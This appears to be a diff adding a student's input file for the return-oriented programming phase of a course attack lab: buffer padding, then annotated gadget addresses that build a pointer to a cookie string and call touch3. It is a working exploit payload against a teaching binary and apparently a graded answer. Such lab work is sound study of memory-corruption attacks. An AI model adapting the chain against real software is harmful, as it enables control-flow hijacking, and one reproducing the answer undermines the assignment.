@@ -1,0 +1,36 @@
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00 
+00 00 00 00
+00 00 00 00
+
+06 1a 40 00	/* address for movq %rsp, %rax from function addval_190 */
+00 00 00 00 
+a2 19 40 00	/* address for movq %rax, %rdi from function addval_273 */
+00 00 00 00
+
+cc 19 40 00	/* address for popq %rax from function getval_280 */
+00 00 00 00
+48 00 00 00	/* string address bias from %rsp above stored in %rdi */
+00 00 00 00
+dd 19 40 00	/* address movl %eax, %edx from function getval_481 */
+00 00 00 00
+34 1a 40 00	/* address for movl %edx, %ecx from function getval_159 */
+00 00 00 00
+13 1a 40 00	/* address for movl %ecx, %esi from function addval_436 */ 
+00 00 00 00
+
+d6 19 40 00	/* address for lea (%rdi, %rsi, 1), %rax from function add_xy */
+00 00 00 00
+a2 19 40 00     /* address for movq %rax, %rdi from function addval_273 */
+00 00 00 00
+fa 18 40 00	/* touch3 address */
+00 00 00 00
+35 39 62 39	/* my new string(cookie) */
+39 37 66 61
+00
